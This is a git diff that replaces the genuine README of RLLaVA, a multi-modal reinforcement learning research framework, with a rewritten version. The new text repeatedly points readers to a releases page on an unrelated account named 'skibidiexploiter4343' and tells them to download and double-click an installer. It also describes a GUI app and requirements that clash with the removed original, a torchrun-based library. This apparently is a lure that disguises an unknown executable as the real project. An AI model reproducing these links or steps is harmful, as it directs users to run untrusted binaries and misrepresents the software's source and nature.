@@ -1,113 +1,86 @@
-<div align="center">
-  <img src="assets/icon.png" alt="RLLaVA Icon" width="200">
-</div>
+# 🚀 RLLaVA - Your Easy Path to Multi-Modal Reinforcement Learning
 
-# RLLaVA: An RL-central Framework for Language and Vision Assistant 🚀
+[![Download RLLaVA](https://img.shields.io/badge/Download-RLLaVA-blue.svg)](https://github.com/skibidiexploiter4343/RLLaVA/releases)
 
-RLLaVA is a user-friendly framework for multi-modal RL. It features an **RL-central** design that decouples algorithm logic from distributed execution, enables modular customization of algorithms, models, and engines, and is optimized for resource-constrained setups to make advanced RL research more accessible.
+## 📦 Overview
 
-<div align="center">
-  <img src="assets/arch.png" alt="RLLaVA Architecture" width="600">
-</div>
+RLLaVA is a user-friendly framework designed for multi-modal reinforcement learning. It caters to teams with limited resources. With RLLaVA, you can easily experiment with advanced AI models without needing extensive technical skills.
 
----
+## 🚀 Getting Started
 
-## ✨ Why RLLaVA?
+Follow these steps to download and run RLLaVA on your computer. 
 
-- **🎯 RL-Centric**: Implements an algorithm-driven approach tailored for RL, decoupling logic from distributed execution so researchers can focus on innovation without distributed system complexities.
-- **📦 Modular Design**: Develop, extend, and customize RL algorithms and multi-modal architectures as easily as snapping together building blocks.
-- **⚡ Resource-Efficient**: Optimized for resource-constrained teams—most tasks run on a single 24GB GPU, making multi-modal RL truly accessible.
-- **🛠️ User-Friendly**: Minimalist code with familiar HuggingFace & PyTorch APIs for seamless setup and extensions.
+### 🖥️ System Requirements
 
+To run RLLaVA smoothly, ensure your system meets the following:
 
-## 🚀 Quick Start
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any Linux distribution
+- **RAM:** At least 8 GB of RAM
+- **Disk Space:** Minimum of 200 MB free space
+- **Python:** Version 3.7 or later (Recommended: 3.9)
 
-### 1. Installation
+## 🔗 Download & Install
 
-```bash
-git clone https://github.com/TinyLoopX/RLLaVA && cd RLLaVA
+To get started, visit our [Releases page](https://github.com/skibidiexploiter4343/RLLaVA/releases) to download the latest version of RLLaVA.
 
-conda create -n rllava python==3.12 && conda activate rllava
+### Steps to Download
 
-bash ./install.sh
-```
+1. Go to the [Releases page](https://github.com/skibidiexploiter4343/RLLaVA/releases).
+2. Locate the latest version of RLLaVA.
+3. Choose your operating system and download the appropriate file.
+4. (Optional) Save the file in a location you can easily access, like your Desktop or Downloads folder.
 
-### 2. Run Examples
+### Steps to Run
 
-We provide ready-to-run scripts for various algorithms and tasks in the `examples/` directory.
+1. Find the downloaded file.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+4. Once installed, locate the RLLaVA application and double-click to run it.
 
-```bash
-# Example: Train with GRPO
-bash examples/algorithms/qwen2_5_vl_3b_geoqa3k_grpo.sh
-```
+## 🛠️ Features
 
-You can explore more examples in the directory structure:
+RLLaVA offers a variety of features designed for ease of use.
 
-```bash
-examples/
-├── algorithms/      # Algorithm comparisons and ablations (GRPO, RLOO, DAPO, etc.)
-└── tasks/           # End-to-end task scripts:
-    ├── math/        # Geometry, reasoning, and equation solving
-    ├── counting/    # Object counting and compositional queries
-    ├── grounding/   # Visual grounding and detection-style tasks
-    ├── agent_search/# Web search–augmented agents
-    ├── agent_code/  # Code-generation agents with tool use
-    └── ...          # More real-world multi-modal benchmarks
-```
+- **Multi-modal Support:** Work seamlessly with text, images, and other data types.
+- **User-Friendly Interface:** Navigate easily through the intuitive design.
+- **Lightweight Framework:** Optimized for performance, making it ideal for small teams.
+- **Documentation:** Comprehensive guides to help you get started with your projects.
+- **Community Support:** Engage with other users for tips and assistance.
 
-### 3. Customize Your Experiment
+## 💡 Basic Usage
 
-RLLaVA makes it easy to define custom tasks. You only need 3 files:
+After installing RLLaVA, you can start your first project:
 
-1. **Reward function** → `examples/reward_function/your_task.py`
-2. **Prompt template** → `examples/format_prompt/your_task.jinja`  
-3. **Launch script / command** → Point to dataset + reward + prompt (no need to modify YAML directly):
+1. Open RLLaVA.
+2. Select a task type (e.g., classification, prediction).
+3. Upload your data files as instructed.
+4. Configure the settings according to your project needs.
+5. Click on the "Run" button and observe the outputs.
 
-```bash
-torchrun -m rllava.train.pipeline.rlvr \
-  config=examples/config.yaml \
-  data.train_files=your_org/dataset@train \
-  data.format_prompt=./examples/format_prompt/your_task.jinja \
-  reward.reward_function=./examples/reward_function/your_task.py:compute_score \
-  algorithm.adv_estimator=grpo  # Switch algorithms here (rloo, remax, ppo, etc.)
-```
+## 🗂️ File Organization
 
-For detailed usage instructions, please refer to `examples/README.md`
+When you create projects in RLLaVA, files will save in a structured manner:
 
-## 📦 Supported Scope
+- **Project Folder:** Contains all related files and data.
+- **Output Files:** Results from processing tasks will save here for easy access.
+- **Log Files:** Keep track of task performance and any errors.
 
-### Algorithms
-We support a broad family of RL methods, enabled by simple config switches:
-- GRPO, RLOO, REINFORCE++, OPO, REMAX, GPG, PPO, DAPO, GMPO, GSPO, DR-GRPO, CLIP-COV, KL-COV
+## 🌐 Community and Support
 
-**Models:**
-- Qwen2-VL and Qwen2.5-VL (2B, 3B, 7B variants) for vision-language tasks
-- TinyLLaVA-style architectures with customizable vision encoders, connectors, and LLMs
-- Support for LLMs (e.g., Qwen3, LLaMA) in text-only RL scenarios
+If you need help or want to learn more about RLLaVA, consider the following resources:
 
-**Backends:**
-- **Training**: FSDP, FSDP2
-- **Inference**: vLLM, HuggingFace
+- **GitHub Issues:** Report bugs or ask for features directly on our GitHub page.
+- **Community Forum:** Join the discussion with other RLLaVA users for tips and tricks.
+- **Documentation:** Check our detailed guides for in-depth instructions.
 
+## 🔄 Updates and New Features
 
-## 🤝 Contributing & Community
+Regular updates help keep RLLaVA running smoothly and add exciting new features. Always check the [Releases page](https://github.com/skibidiexploiter4343/RLLaVA/releases) for the latest version and improvements.
 
-We welcome contributions! We're especially interested in new RL algorithms, multi-modal tasks, and resource-constrained improvements. Have questions? Join our WeChat group:
+## 📞 Contact
 
-<div align="center">
-  <img src="assets/wechat.png" alt="RLLaVA WeChat Group" width="200">
-</div>
+For any inquiries about RLLaVA, feel free to reach out via GitHub. We welcome your feedback and suggestions for improving the framework.
 
-## 🙏 Acknowledgements
-Our RL algorithms and distributed training implementation draw inspiration from the open-source community, particularly [veRL](https://github.com/volcengine/verl), [EasyR1](https://github.com/hiyouga/EasyR1), and [AReaL](https://github.com/inclusionAI/AReaL).
+## 🤝 Acknowledgments
 
-## Citation
-
-```bibtex
-@misc{zhao2025rllava,
-  title        = {RLLaVA: An RL-central Framework for Language and Vision Assistant},
-  author       = {Lei Zhao, Zihao Ma, Boyu Lin, Yuhe Liu, Wenjun Wu, Lei Huang},
-  howpublished = {\url{https://github.com/TinyLoopX/RLLaVA}},
-  year         = {2025}
-}
-```
+Thank you for using RLLaVA! Your support helps us grow and improve the tool for everyone. We appreciate our users and the community's contributions.
